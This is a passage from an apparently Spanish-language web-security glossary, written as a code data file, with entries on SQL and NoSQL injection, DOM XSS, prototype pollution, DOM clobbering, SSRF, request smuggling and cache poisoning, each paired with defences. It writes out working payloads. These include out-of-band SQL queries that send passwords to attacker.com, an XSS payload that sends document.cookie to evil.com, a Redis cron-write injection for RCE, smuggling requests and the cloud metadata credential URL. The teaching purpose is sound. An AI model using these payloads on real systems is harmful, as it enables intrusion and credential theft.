      "\n**Vector 6: Mass Assignment via mutation**\n" +
      "```graphql\nmutation { updateUser(input: { id: 1, role: \"admin\" }) { id role } }\n```\nSi el input type acepta `role` y el resolver no whitelistea, escalada.\n" +
      "\n**Casos reales:**\n" +
      "• **GitHub 2021** — batching abuse en GraphQL rate-limit bypass ($10K bounty).\n" +
      "• **Shopify 2020** — mass assignment en GraphQL mutations.\n" +
      "• **HackerOne 2019** — GraphQL introspection expuso endpoints internos.\n" +
      "\n**Herramientas:**\n" +
      "• **InQL** (Burp Extension) — auto-detecta y explora schemas.\n" +
      "• **GraphQL Voyager** — visualiza el schema.\n" +
      "• **CleaGraph, GraphQL Shield** — middlewares de auth.\n" +
      "> 💡 **OWASP GraphQL Cheat Sheet** cubre defense in depth.\n" +
      "> ⚠️ REST-first thinking mal aplicado a GraphQL: no basta con auth por endpoint; hay que autorizar por resolver / field.",
    examples: [
      "Query complexity limit: 100 puntos, cada nested = 10x más.",
      "GitHub 2021 GraphQL batching bypass rate-limit: $10K bounty.",
      "InQL Burp extension automatiza introspection + fuzzing.",
    ],
    related: ["OWASP Top 10", "BOLA / IDOR y Broken Object Level Auth", "HTTP Parameter Pollution (HPP)", "AAA (Autenticación, Autorización, Accounting)"],
  },

  // ── M23 · SQL Injection y XSS ────────────────────────────────────────────
  {
    id: 260,
    module: 23,
    term: "SQL Injection",
    short: "Inyectar SQL a través de entrada no sanitizada para manipular la base de datos.",
    detail:
      "La **SQL Injection (SQLi)** ocurre cuando la entrada del usuario se concatena en una consulta. Tipos principales:\n" +
      "• **Clásica:** ' OR 1=1 --\n" +
      "• **UNION:** ' UNION SELECT usuario,clave FROM users --\n" +
      "• **Blind (booleana):** ' AND SUBSTRING(@@version,1,1)='8' --\n" +
      "• **Time-based:** ' AND IF(1=1,SLEEP(5),0) --\n" +
      "> 💡 Defensa definitiva: **consultas parametrizadas** (prepared statements); nunca concatenar entrada.",
    examples: [
      "Saltarse un login con ' OR 1=1 -- como usuario.",
      "Extraer la tabla de usuarios con un UNION SELECT.",
    ],
    related: ["Injection", "Herramientas: sqlmap", "Prevención de inyección"],
  },
  {
    id: 261,
    module: 23,
    term: "Cross-Site Scripting (XSS)",
    short: "Inyectar JavaScript que se ejecuta en el navegador de otras víctimas.",
    detail:
      "El **XSS** inyecta script que corre en el contexto de la víctima (puede robar sesión, hacer acciones). Tres tipos:\n" +
      "| Tipo | Dónde vive |\n" +
      "|---|---|\n" +
      "| Reflected | En la URL/petición, no persiste |\n" +
      "| Stored | Persistido en el servidor (comentario) |\n" +
      "| DOM-based | En el JS del cliente, sin tocar el servidor |\n" +
      "> ⚠️ Un payload típico stored: una imagen con `onerror` que lee `document.cookie`.",
    examples: [
      "Un comentario con script que se ejecuta en quien lo lee (stored).",
      "?q=<script>... reflejado sin sanitizar (reflected).",
    ],
    related: ["Injection", "Headers de seguridad", "Prevención de inyección"],
  },
  {
    id: 262,
    module: 23,
    term: "Herramientas: sqlmap",
    short: "El estándar para automatizar la detección y explotación de SQL Injection.",
    detail:
      "**sqlmap** automatiza todo el ciclo de SQLi: detecta el punto inyectable, identifica el motor, extrae bases de datos/tablas y hasta obtiene una shell. Para XSS existen fuzzers como **XSStrike**.\n" +
      "sqlmap -u \"https://sitio/item?id=1\" --dbs\n" +
      "> ⚠️ Usar solo con autorización explícita; son herramientas de pentest, no de uso libre.",
    examples: [
      "Enumerar bases de datos con sqlmap --dbs.",
      "Volcar una tabla con sqlmap --dump.",
    ],
    related: ["SQL Injection", "Cross-Site Scripting (XSS)", "Prevención de inyección"],
  },
  {
    id: 263,
    module: 23,
    term: "Prevención de inyección",
    short: "Parametrizar, validar entrada y codificar salida cierra SQLi y XSS.",
    detail:
      "Las defensas son bien conocidas:\n" +
      "• **SQLi** → **consultas parametrizadas/ORM**, mínimo privilegio del usuario de BD.\n" +
      "• **XSS** → **codificación de salida** según contexto, **CSP**, frameworks que escapan por defecto, cookies **HttpOnly**.\n" +
      "• Transversal → **validar/normalizar** toda entrada y un **WAF** como capa extra.\n" +
      "> 💡 Un WAF ayuda pero no sustituye el código seguro: hay técnicas de bypass.",
    examples: [
      "Prepared statements en vez de concatenar SQL.",
      "Escapar la salida HTML y aplicar una CSP estricta.",
    ],
    related: ["SQL Injection", "Cross-Site Scripting (XSS)", "Headers de seguridad"],
  },
  {
    id: 264,
    module: 23,
    term: "Blind SQL Injection y OOB exfiltration",
    short: "Sin response visible, el atacante infiere datos por tiempos, bool o out-of-band vía DNS. Igual de efectiva que in-band SQLi.",
    detail:
      "En **SQLi in-band** el atacante ve la data en la response. En **blind SQLi** no — pero el bug sigue ahí. Se explota por **canales laterales**.\n" +
      "\n**Tipo 1: Boolean-based blind**\n" +
      "Compara respuestas true/false por diferencias visibles (200 vs 500, 'Welcome' vs 'Error'):\n" +
      "```sql\n' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1) = 'a' --\n```\n" +
      "Itera carácter por carácter. Lento pero efectivo.\n" +
      "\n**Tipo 2: Time-based blind**\n" +
      "Sin diferencia en response — pero el server *tarda* si la condición es true:\n" +
      "```sql\n// MySQL\n' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0) --\n\n// PostgreSQL\n'; SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END --\n\n// SQL Server\n'; IF (SUBSTRING(password,1,1)='a') WAITFOR DELAY '0:0:5' --\n\n// Oracle\n' AND CASE WHEN (SUBSTRING(password,1,1)='a') THEN dbms_pipe.receive_message(('a'),5) ELSE null END --\n```\n" +
      "\n**Tipo 3: Out-of-band (OOB) via DNS**\n" +
      "El más rápido si el DB puede hacer requests salientes:\n" +
      "```sql\n// MySQL con LOAD_FILE (requires FILE priv)\nSELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\\\a.txt'))\n\n// PostgreSQL con dblink extension\nSELECT dblink('host='||(SELECT password FROM users LIMIT 1)||'.attacker.com user=x password=y', 'SELECT 1');\n\n// SQL Server\nEXEC master..xp_dirtree '\\\\\\\\attacker.com\\\\'+password+'\\\\a.txt'\n\n// Oracle\nSELECT UTL_HTTP.REQUEST('http://'||password||'.attacker.com') FROM DUAL;\n```\n" +
      "El DNS del atacante logea `<password>.attacker.com`. Un solo request → toda la password extraída.\n" +
      "\n**Herramientas:**\n" +
      "• **sqlmap** con `--technique=B` (boolean), `-T` (time), `--dns-domain=attacker.com` (OOB).\n" +
      "• **Burp Collaborator** para OOB sin infra propia.\n" +
      "\n**Contramedidas:**\n" +
      "• **Prepared statements** — la única cura.\n" +
      "• Deshabilitar funciones peligrosas (`xp_cmdshell`, `LOAD_FILE`, `dblink`) en accounts de app.\n" +
      "• Egress firewall del DB — bloquear DNS + HTTP salientes.\n" +
      "> 💡 En 2023 muchas apps usan ORMs que evitan concatenación — pero raw queries siguen existiendo. Auditar `db.query('...' + user_input)`.\n" +
      "> ⚠️ Bugs de blind SQLi pasan desapercibidos en scanners que buscan reflejos.",
    examples: [
      "sqlmap con `--dbs --technique=T --level=5`.",
      "Egress rule: `iptables -A OUTPUT -o eth0 -j REJECT` en DB server.",
      "Auditoría con Burp Collaborator para OOB detection.",
    ],
    related: ["SQL Injection", "OWASP Top 10", "NoSQL Injection", "HTTP Parameter Pollution (HPP)"],
  },
  {
    id: 265,
    module: 23,
    term: "NoSQL Injection",
    short: "MongoDB, Redis, DynamoDB tienen sus propios vectores. $where en Mongo permite JS arbitrario; $ne bypass auth trivial.",
    detail:
      "Los NoSQL heredaron un mito: *'no hay SQL, no hay SQLi'*. Falso. Cada NoSQL tiene su sintaxis y sus vectores.\n" +
      "\n**MongoDB — el más explotado**\n" +
      "\n**Vector 1: Auth bypass con `$ne`**\n" +
      "```javascript\n// Vulnerable Express + Mongo\napp.post('/login', (req, res) => {\n  db.users.findOne({ user: req.body.user, pass: req.body.pass })\n});\n\n// Payload JSON\n{ \"user\": \"admin\", \"pass\": { \"$ne\": \"\" } }\n// Query: findOne({ user: 'admin', pass: {$ne: ''} }) → matches any pass\n```\n" +
      "\n**Vector 2: `$where` con JS arbitrario**\n" +
      "```javascript\n{ \"$where\": \"function() { return this.password.length > 5 }\" }\n// Ejecuta JS en el server MongoDB (blind extraction)\n\n// O DoS\n{ \"$where\": \"function() { while(1); }\" }\n```\n" +
      "\n**Vector 3: `$regex` con backtracking**\n" +
      "```javascript\n{ \"user\": { \"$regex\": \"^admin\" } }\n// Iterar para blind extraction\n```\n" +
      "\n**Vector 4: Operator injection**\n" +
      "```javascript\n// Endpoint expone filter directo\nGET /api/users?filter[$gt]=\n// db.users.find({$gt: ''}) → todos los users\n```\n" +
      "\n**Redis — command injection**\n" +
      "Si la app pasa input al comando Redis sin escapar:\n" +
      "```\nSET foo <user_input>\n// user_input: \"bar\\r\\nCONFIG SET dir /var/spool/cron\\r\\nCONFIG SET dbfilename root\\r\\nSAVE\"\n// Escapes → RCE por cron file writing\n```\n" +
      "\n**DynamoDB — condition expression injection**\n" +
      "```javascript\nParams: {\n  FilterExpression: `attribute = :val`,\n  ExpressionAttributeValues: { ':val': user_input }\n}\n// user_input: 'x OR user_id = :any' — condition bypass\n```\n" +
      "\n**Elasticsearch — query DSL injection**\n" +
      "```json\nGET /_search\n{ \"query\": { \"query_string\": { \"query\": \"user:${input}\" } } }\n// input: `admin OR _exists_:password`\n// Bypass filter, exfiltrate passwords via score\n```\n" +
      "\n**Herramientas:**\n" +
      "• **NoSQLmap** — Mongo/Couch equivalente de sqlmap.\n" +
      "• **Burp NoSQL Scanner** — extension.\n" +
      "\n**Contramedidas:**\n" +
      "• **Type check el input** — si esperás string, rechazá objetos: `if (typeof pass !== 'string') reject`.\n" +
      "• **Deshabilitar `$where`** en Mongo prod: `enableTestCommands: 0`.\n" +
      "• **Parametrizar** al máximo — evitar template strings.\n" +
      "• **ODM/ORMs** (Mongoose, Sequelize) — validan schema y tipo.\n" +
      "> 💡 **MongoDB Atlas** vulnerable a `$ne` bypass en muchas apps Node.js populares (Ghost CMS, etc. en el pasado).\n" +
      "> ⚠️ Firebase Realtime DB tiene su propio vector: rules mal escritas + client-side auth check.",
    examples: [
      "Mongoose schema con tipos estrictos previene `$ne` injection.",
      "Redis: usar `redis-cli --no-raw` + escape en el driver.",
      "NoSQLmap vs local Mongo lab para practicar detección.",
    ],
    related: ["SQL Injection", "OWASP Top 10", "Blind SQL Injection y OOB exfiltration", "BOLA / IDOR y Broken Object Level Auth"],
  },
  {
    id: 266,
    module: 23,
    term: "DOM-based XSS y sinks modernos",
    short: "innerHTML, eval, document.write, location.href, y templates JS ejecutan atacker-controlled data sin server involvement.",
    detail:
      "El **DOM XSS** vive **enteramente en el navegador**. El servidor no envía el payload — el JS de la página lo lee de un **source** (URL, localStorage, postMessage) y lo escribe en un **sink** peligroso. No hay logs server, no hay CSP nonce que salve si no hay Trusted Types.\n" +
      "\n**Sources (donde el atacante controla):**\n" +
      "| Source | Ejemplo | Riesgo |\n" +
      "|---|---|---|\n" +
      "| `location.hash` | `#<script>...` | XSS reflected via URL fragment |\n" +
      "| `location.search` | `?q=<script>...` | Idem, en query |\n" +
      "| `document.referrer` | Referer header | Attacker-controlled |\n" +
      "| `postMessage` data | `window.postMessage(...)` | Cross-frame injection |\n" +
      "| `localStorage/sessionStorage` | Persisted attacker data | Stored DOM XSS |\n" +
      "| `WebSocket messages` | | Chat apps clásicos |\n" +
      "\n**Sinks (donde ejecuta):**\n" +
      "| Sink | Payload |\n" +
      "|---|---|\n" +
      "| `element.innerHTML = X` | `<img src=x onerror=alert(1)>` |\n" +
      "| `document.write(X)` | Cualquier HTML |\n" +
      "| `eval(X)`, `Function(X)()` | Cualquier JS |\n" +
      "| `location = X` | `javascript:alert(1)` (auto-navega) |\n" +
      "| `setTimeout(X, ...)` con string | JS |\n" +
      "| `<div dangerouslySetInnerHTML={{__html: X}} />` (React) | HTML sin sanitizar |\n" +
      "| `[innerHTML]` (Angular sin `[textContent]`) | |\n" +
      "\n**Ejemplo canónico:**\n" +
      "```html\n<script>\n  const q = new URLSearchParams(location.search).get('q');\n  document.getElementById('result').innerHTML = q; // SINK\n</script>\n<!-- Payload: ?q=<img src=x onerror=fetch('//evil.com/'+document.cookie)> -->\n```\n" +
      "\n**postMessage XSS:**\n" +
      "```javascript\nwindow.addEventListener('message', (e) => {\n  // BAD: sin verificar origin\n  document.body.innerHTML = e.data;\n});\n// Attacker sitio: window.open(target).postMessage('<script>...</script>', '*')\n```\n" +
      "Fix: **siempre validar `e.origin`** contra whitelist.\n" +
      "\n**jQuery `$()` con user input:**\n" +
      "```javascript\n$('#result').html(user_input); // XSS\n// vs\n$('#result').text(user_input); // safe\n```\n" +
      "\n**Trusted Types como defensa nativa:**\n" +
      "```javascript\ntrustedTypes.createPolicy('sanitizer', {\n  createHTML: (str) => DOMPurify.sanitize(str)\n});\n// Ahora innerHTML = string plano LANZA TypeError; solo acepta objetos TrustedHTML\n```\n" +
      "\n**Contramedidas:**\n" +
      "• **Trusted Types** + policy central que sanitiza (DOMPurify).\n" +
      "• **CSP con `require-trusted-types-for 'script'`** — el browser rechaza sinks sin type.\n" +
      "• **Auditoría estática**: buscar sinks con Semgrep rules.\n" +
      "• **Preferir APIs seguras**: `textContent` > `innerHTML`, `URL()` > string concat.\n" +
      "> 💡 **PortSwigger DOM Invader** (Burp extension) fuzza sources y detecta sinks automáticamente.\n" +
      "> ⚠️ En SPAs modernas (React/Vue/Angular) los frameworks escapan por default, PERO `dangerouslySetInnerHTML` / `v-html` / `[innerHTML]` bypassa. Grep de esos.",
    examples: [
      "React: `dangerouslySetInnerHTML={{__html: DOMPurify.sanitize(userInput)}}`.",
      "Trusted Types en Gmail: bloquea DOM XSS antes de que ejecute.",
      "DOM Invader Burp: auto-descubre sources → sinks.",
    ],
    related: ["Cross-Site Scripting (XSS)", "Content Security Policy (CSP) moderno", "Prototype Pollution", "DOM Clobbering"],
  },
  {
    id: 267,
    module: 23,
    term: "Prototype Pollution",
    short: "Contaminar Object.prototype vía __proto__ o constructor.prototype. Todos los objetos heredan el gadget → RCE via popular libs.",
    detail:
      "**Prototype pollution** ocurre cuando JS permite escribir en `__proto__` o `constructor.prototype` con input controlado. Toda instancia de Object hereda del prototype global — al contaminarlo, cambia el comportamiento de **toda** la app.\n" +
      "\n**Vector clásico — merge / clone recursivo mal escrito:**\n" +
      "```javascript\nfunction merge(target, source) {\n  for (let key in source) {\n    if (typeof source[key] === 'object') {\n      target[key] = merge(target[key] || {}, source[key]);\n    } else {\n      target[key] = source[key];\n    }\n  }\n  return target;\n}\n\n// PAYLOAD del atacante (JSON body, query params):\nmerge({}, JSON.parse(`{\"__proto__\": {\"isAdmin\": true}}`));\n\n// Todos los objetos ahora heredan isAdmin=true\nconst user = {};\nconsole.log(user.isAdmin); // true !!\n```\n" +
      "\n**Librerías históricamente vulnerables:**\n" +
      "• **lodash** `_.merge/_.set` (CVE-2019-10744, CVE-2020-8203).\n" +
      "• **jQuery** `$.extend(true, ...)` (CVE-2019-11358).\n" +
      "• **mixin-deep, set-value, defaults-deep, immer, express** en diferentes momentos.\n" +
      "\n**Client-side vs server-side impact:**\n" +
      "\n**Server-side (Node.js) → RCE**\n" +
      "```javascript\n// Payload: {\"__proto__\": {\"env\": \"NODE_OPTIONS=--inspect=0.0.0.0\"}}\n// Contamina process.env vía prototype → next child_process con node debug enabled\n// O gadgets en libraries: fastify, express, Handlebars con eval en options\n```\n" +
      "\n**Client-side (browser) → XSS**\n" +
      "El gadget más común: **HTMLTemplateElement**:\n" +
      "```javascript\n// Vulnerable code\nfunction render(data) {\n  const t = data.template || 'div';\n  return `<${t}>${data.content}</${t}>`;\n}\n\n// Con pollution: __proto__.template = '<img src=x onerror=alert(1)>'\n// data.template está undefined pero hereda del proto → XSS\n```\n" +
      "\n**Detección:**\n" +
      "```javascript\nObject.prototype.polluted = true;\nlet clean = {};\nif (clean.polluted === true) console.log('POLLUTED!');\ndelete Object.prototype.polluted;\n```\n" +
      "En browser DevTools: `Object.prototype` — enumera keys extra.\n" +
      "\n**Contramedidas:**\n" +
      "• **`Object.create(null)`** en vez de `{}` — objetos sin prototype.\n" +
      "• **`Object.freeze(Object.prototype)`** al inicio de la app.\n" +
      "• **JSON schema validation** — rechazar keys `__proto__`, `constructor`, `prototype`.\n" +
      "• **`--disable-proto=throw`** flag de Node.js (v14.4+).\n" +
      "• **Uso de `Map` en vez de object literal** para diccionarios controlados.\n" +
      "> 💡 **CVE-2019-10744 lodash** — muchos apps grandes afectados porque `_.merge` estaba en la cadena de deps.\n" +
      "> ⚠️ Frameworks modernos (Fastify, Kysely) marcan pollution como bug crítico y hardening explícito.",
    examples: [
      "`Object.freeze(Object.prototype)` como primera línea del bootstrap.",
      "Semgrep rule: `pattern-either: [merge($X, $USER_INPUT), _.set($X, $KEY, $USER_INPUT)]`.",
      "PortSwigger academy tiene labs de client-side + server-side pollution.",
    ],
    related: ["OWASP Top 10", "DOM-based XSS y sinks modernos", "Cross-Site Scripting (XSS)", "DOM Clobbering"],
  },
  {
    id: 268,
    module: 23,
    term: "DOM Clobbering",
    short: "HTML injection sin JS ejecutable puede sobreescribir variables globales via elementos con id o name.",
    detail:
      "**DOM Clobbering** es un ataque **HTML-only** — sin `<script>`, sin JS ejecutable, sin bypass de CSP `script-src 'none'`. Aprovecha que HTML crea propiedades globales cuando elementos tienen `id` o `name`.\n" +
      "\n**Comportamiento fundamental de HTML:**\n" +
      "```html\n<img id=cookie>\n<script>console.log(window.cookie);</script>\n// window.cookie === el <img>, NO la propiedad document.cookie\n```\nCualquier `<elemento id=X>` crea `window.X`.\n" +
      "\n**Vector 1: Sobrescribir la propiedad esperada**\n" +
      "```javascript\n// Vulnerable code\nif (window.config) {\n  loadConfig(window.config.url);\n}\n// Atacante inyecta HTML (aún con XSS mitigada):\n<a id=config><a id=config name=url href=\"//evil.com\">\n// window.config.url === '//evil.com'\n// loadConfig('//evil.com') → CSRF, exfil, redirect\n```\n\n" +
      "**Vector 2: form clobbering**\n" +
      "```html\n<form id=login></form>\n<script>\n  const isAuth = login.action !== undefined;\n  // Atacante: <form id=login action=/></form>\n  // login.action = '/' → app cree que está autenticado\n</script>\n```\n\n" +
      "**Vector 3: `document.querySelector` cache pollution**\n" +
      "```html\n<a id=defaultAvatar name=defaultAvatar href=\"//evil.com/pic.jpg\">\n// document.defaultAvatar.href → attacker URL\n```\n\n" +
      "**Vector 4: Bypass de `sanitize()` bibliotecas**\n" +
      "**DOMPurify** históricamente permitió elementos como `<form>`, `<a>` con `id/name`. Aunque no ejecuta JS, clobbering pasa. DOMPurify agregó `SANITIZE_DOM` en 2020 para cubrir esto.\n" +
      "\n**Vector 5: `import.meta` clobbering (2023 research)**\n" +
      "Módulos ES6 tienen `import.meta.url` que a veces se usa para paths. Clobbering permite reescribirlo en algunas configs.\n" +
      "\n**Casos reales:**\n" +
      "• **Gareth Heyes 2020** — investigación seminal, PortSwigger blog. Bypasses de HTMLSanitizer múltiples.\n" +
      "• **CVE-2020-26870** en dompurify — clobbering permitido.\n" +
      "• **Google 2022** — bug bounty por DOM Clobbering en un chat product.\n" +
      "\n**Contramedidas:**\n" +
      "• **Verificar tipo antes de usar globals**: `if (typeof window.config === 'object' && !window.config.tagName)`.\n" +
      "• **Sanitizer strict**: DOMPurify con `SANITIZE_DOM: true` + `FORBID_ATTR: ['id', 'name']`.\n" +
      "• **Prefiere `let/const` locales** en vez de globals.\n" +
      "• **CSP Trusted Types** ayuda porque forza sanitizer que rechaza esos elementos.\n" +
      "• **Content-Security-Policy: default-src 'self'** no ayuda (no hay JS que bloquear).\n" +
      "> 💡 **Portswigger DOM Invader** detecta clobbering automáticamente.\n" +
      "> ⚠️ Muchos WAF y sanitizers viejos no cubren clobbering — es un vector clásico bypass de defensas XSS strict.",
    examples: [
      "DOMPurify: `SANITIZE_DOM: true, SANITIZE_NAMED_PROPS: true` desde 3.x.",
      "Google Chat 2022 bug bounty por DOM clobbering.",
      "Auditoría: `grep -r 'window\\.[a-zA-Z]' + verificar acceso sin type check`.",
    ],
    related: ["Cross-Site Scripting (XSS)", "DOM-based XSS y sinks modernos", "Prototype Pollution", "Content Security Policy (CSP) moderno"],
  },

  // ── M24 · CSRF, SSRF y File Upload ───────────────────────────────────────
  {
    id: 270,
    module: 24,
    term: "Cross-Site Request Forgery (CSRF)",
    short: "Engañar al navegador de una víctima autenticada para que ejecute una acción no deseada.",
    detail:
      "El **CSRF** abusa de que el navegador **adjunta las cookies automáticamente**: un sitio malicioso provoca una petición (transferir dinero, cambiar email) usando la sesión activa de la víctima, sin leer la respuesta.\n" +
      "> 💡 Defensa: **tokens anti-CSRF** (como `al_csrf` en AlphaLog) + cookies **SameSite**. La verificación token-en-header vs cookie es justo el patrón del middleware del proyecto.",
    examples: [
      "Una imagen oculta que dispara una transferencia con tu sesión.",
      "AlphaLog exige x-csrf-token == cookie al_csrf en mutaciones.",
    ],
    related: ["Cookie security", "SSRF y metadata cloud", "IDOR y referencias inseguras"],
  },
  {
    id: 271,
    module: 24,
    term: "SSRF y metadata cloud",
    short: "Forzar al servidor a pedir recursos internos, incluido el endpoint de metadata de la nube.",
    detail:
      "El **SSRF** se vuelve crítico en la nube: el endpoint de **metadata** (`169.254.169.254`) entrega **credenciales IAM** temporales al instar a la app a consultarlo.\n" +
      "http://169.254.169.254/latest/meta-data/iam/security-credentials/\n" +
      "> ⚠️ Caso **Capital One (2019)**: SSRF vía un WAF mal configurado robó datos de 100M+ personas. **IMDSv2** (token obligatorio) mitiga este vector.",
    examples: [
      "Leer credenciales IAM vía el endpoint de metadata por SSRF.",
      "Habilitar IMDSv2 para exigir un token y frenar el abuso.",
    ],
    related: ["Server-Side Request Forgery (SSRF)", "Cross-Site Request Forgery (CSRF)", "Ataques de subida de archivos"],
  },
  {
    id: 272,
    module: 24,
    term: "IDOR y referencias inseguras",
    short: "Acceder a objetos ajenos manipulando un identificador previsible.",
    detail:
      "Un **IDOR** (*Insecure Direct Object Reference*) expone objetos por su identificador sin verificar la **autorización** del solicitante. Es la manifestación más común de Broken Access Control y suele ser trivial de explotar.\n" +
      "GET /api/pedido/1001  →  GET /api/pedido/1002\n" +
      "> 💡 Defensa: verificar ownership en el servidor en cada acceso; usar identificadores no predecibles (UUID) como capa extra.",
    examples: [
      "Cambiar el id de un pedido en la URL y ver el de otro usuario.",
      "Descargar /docs/124.pdf siendo dueño solo del 123.",
    ],
    related: ["Broken Access Control", "Cross-Site Request Forgery (CSRF)", "Principio de mínimo privilegio"],
  },
  {
    id: 273,
    module: 24,
    term: "Ataques de subida de archivos",
    short: "Subidas mal validadas permiten webshells, RCE y otros abusos.",
    detail:
      "Una subida de archivos insegura puede dar control del servidor:\n" +
      "• Subir un **webshell** (`shell.php`) y ejecutarlo → **RCE**.\n" +
      "• Bypass por **Content-Type** falso o **doble extensión** (`shell.php.jpg`).\n" +
      "• **Path traversal** en el nombre (`../../`), XSS vía SVG/HTML, zip bombs (DoS).\n" +
      "> ✅ Defensa: validar el tipo por **contenido (magic bytes)** no por extensión, renombrar, almacenar **fuera del webroot**, límites de tamaño y escaneo AV.",
    examples: [
      "Subir shell.php.jpg para saltarse el filtro de extensión.",
      "Guardar las subidas en storage dedicado fuera del webroot.",
    ],
    related: ["SSRF y metadata cloud", "Injection", "Hardening y CIS Benchmarks"],
  },
  {
    id: 274,
    module: 24,
    term: "HTTP Request Smuggling (CL.TE, TE.CL, H2.CL)",
    short: "Front-end y back-end interpretan el fin de un request diferente. El atacante mete parte de un request en el próximo cliente. Bounty king.",
    detail:
      "**HTTP Request Smuggling** (HRS) explota la **desalineación entre proxy front-end y back-end** sobre cuándo termina un request. Investigado por James Kettle (PortSwigger, 2019) — abrió un mundo de bounties de 6 cifras.\n" +
      "\n**Fundamento:**\nHTTP/1.1 tiene dos formas de indicar el fin del body:\n" +
      "1. **`Content-Length: N`** — N bytes de body.\n" +
      "2. **`Transfer-Encoding: chunked`** — chunks de tamaño variable terminados en `0\\r\\n\\r\\n`.\n" +
      "\nSi ambos headers están presentes, la spec dice que **`Transfer-Encoding` gana**. Pero en la práctica, muchos proxies/servidores discrepan.\n" +
      "\n**Variante 1: CL.TE — front usa CL, back usa TE**\n" +
      "```http\nPOST / HTTP/1.1\nHost: victim.com\nContent-Length: 13\nTransfer-Encoding: chunked\n\n0\n\nSMUGGLED\n```\n" +
      "• Front-end: lee 13 bytes = `0\\r\\n\\r\\nSMUGGLED` → todo un request.\n" +
      "• Back-end: chunked → lee `0\\r\\n\\r\\n` (fin) → **`SMUGGLED` queda buffered para el próximo request**.\n" +
      "El próximo user real llega, su request se **prefija con `SMUGGLED`** → attack.\n" +
      "\n**Variante 2: TE.CL — front usa TE, back usa CL**\n" +
      "```http\nPOST / HTTP/1.1\nContent-Length: 3\nTransfer-Encoding: chunked\n\n8\nSMUGGLED\n0\n\n```\n" +
      "• Front: chunked → lee todo.\n" +
      "• Back: CL=3 → lee solo `8\\r\\n`, deja resto para el siguiente request.\n" +
      "\n**Variante 3: TE.TE — ambos usan TE, pero uno de los dos ignora una variante malformada**\n" +
      "```\nTransfer-Encoding: chunked\nTransfer-Encoding: xchunked\n```\nUn proxy ignora la segunda, el otro la interpreta como override.\n" +
      "\n**Variante 4: H2.CL / H2.TE — HTTP/2 downgrade**\n" +
      "El front habla HTTP/2 con el client, downgrade a HTTP/1.1 al back-end. Los headers HTTP/2 no tienen CL/TE — el proxy los genera. Bugs en la conversión permiten smuggling. **2021 Kettle's talk 'HTTP/2: The Sequel is Always Worse'** cubre esto.\n" +
      "\n**Impacto:**\n" +
      "• **Prepend admin actions** al request del siguiente user.\n" +
      "• **Bypass de WAF** — el WAF ve el request 'limpio', el smuggled va al back-end.\n" +
      "• **Session hijack** vía cache poisoning.\n" +
      "• **XSS reflected en response del next user**.\n" +
      "\n**Detección:**\n" +
      "• **HTTP Request Smuggler** (Burp extension oficial de PortSwigger) — fuzzing automático.\n" +
      "• **Response de timeouts** — un smuggling deja el back esperando bytes que no llegan.\n" +
      "\n**Contramedidas:**\n" +
      "• **HTTP/2 end-to-end** — sin downgrade.\n" +
      "• **Rechazar requests ambiguos** — WAF que devuelve 400 si CL + TE están presentes.\n" +
      "• **Normalizar en el edge** — proxy que reescribe headers antes del back.\n" +
      "• **Frameworks modernos** (Go net/http, Node.js recientes) ya son estrictos.\n" +
      "> 💡 **James Kettle's talks (2019, 2021)** son la referencia definitiva. Cobró $10K-$100K en Bug Bounty múltiples veces.\n" +
      "> ⚠️ HRS es difícil de detectar en runtime — impacta al **siguiente user**, no al atacante que lo dispara.",
    examples: [
      "Kettle 2019 (Black Hat): PayPal, Slack, múltiples smuggling con bounties de 5-6 cifras.",
      "Burp HTTP Request Smuggler extension: fuzz automático.",
      "Cloudflare 2020: rechaza requests con CL+TE por default.",
    ],
    related: ["OWASP Top 10", "HTTP Parameter Pollution (HPP)", "Cache poisoning y web cache deception", "Cross-Site Scripting (XSS)"],
  },
  {
    id: 275,
    module: 24,
    term: "Cache poisoning y web cache deception",
    short: "Envenenar la cache del CDN con response del atacante. Cache deception hace que la victima's data se guarde en un path público.",
    detail:
      "**Cache Poisoning** manipula la cache compartida (Varnish, Cloudflare, Akamai) para que **sirva contenido malicioso a otros users**. **Cache Deception** hace que la cache **guarde datos privados** (JWT, cookies) en un path público accessible por atacantes.\n" +
      "\n**Cache Poisoning — vector clásico (unkeyed input):**\n" +
      "\nLa cache indexa por **cache key** (típicamente URL + método + a veces algunos headers). Si el server refleja **otros inputs** (headers no incluidos en la key) en la response, atacante los envenena:\n" +
      "\n```http\nGET /login HTTP/1.1\nHost: victim.com\nX-Forwarded-Host: <script>alert(1)</script>\n// Response del server refleja X-Forwarded-Host en <meta canonical>\n// La cache guarda esta response con key = /login\n// Todo user siguiente en /login recibe el XSS\n```\n\n" +
      "**Herramientas:**\n" +
      "• **Param Miner** (Burp) — auto-detecta unkeyed params (headers, query strings) que la app procesa.\n" +
      "\n**Cache Poisoning DoS:**\n" +
      "```http\nGET / HTTP/1.1\nX-Original-URL: /nonexistent  // Server 404s\n// Cache key = /, guarda 404, todos ven 404 (DoS)\n```\n\n" +
      "**Cache Deception — vector clásico:**\n" +
      "\nLas CDNs cachean por extensión: `.js`, `.css`, `.png` van a cache. Atacante fuerza a la víctima a visitar:\n" +
      "```\nhttps://victim.com/profile/attacker.css\n```\n" +
      "El server ignora el `/attacker.css` y sirve el profile del user (con datos privados). El **CDN cachea** por la extensión CSS. El atacante después visita el mismo URL y **lee el cache** con el HTML del profile de la víctima.\n" +
      "\n**Casos reales:**\n" +
      "• **PayPal 2017** (Omer Gil) — descubrimiento seminal de web cache deception.\n" +
      "• **Slack 2020** — cache poisoning por header injection en shared endpoints.\n" +
      "• **GitHub 2019** — cache poisoning DoS por `X-Forwarded-Scheme`.\n" +
      "\n**Contramedidas:**\n" +
      "• **Cache key = todos los inputs relevantes** — incluir headers que la app procesa.\n" +
      "• **Vary header correcto** — `Vary: X-Forwarded-Host` si se refleja.\n" +
      "• **No cachear responses con data privada** — verificar `Cache-Control: private, no-store` en responses autenticadas.\n" +
      "• **Normalizar path** — rechazar paths con doble slash, `/../`, extensiones no válidas antes de servir.\n" +
      "• **Cache key incluye status** — no cachear 4xx/5xx.\n" +
      "> 💡 **PortSwigger blog 2020 Practical Web Cache Poisoning** es la referencia. Kettle nuevamente.\n" +
      "> ⚠️ Cache Poisoning tiene **blast radius enorme** — un solo request malicioso puede afectar millones de users.",
    examples: [
      "Param Miner Burp: `Guess params` detects unkeyed inputs.",
      "GitHub 2019 DoS via cache-poisoning $10K bounty.",
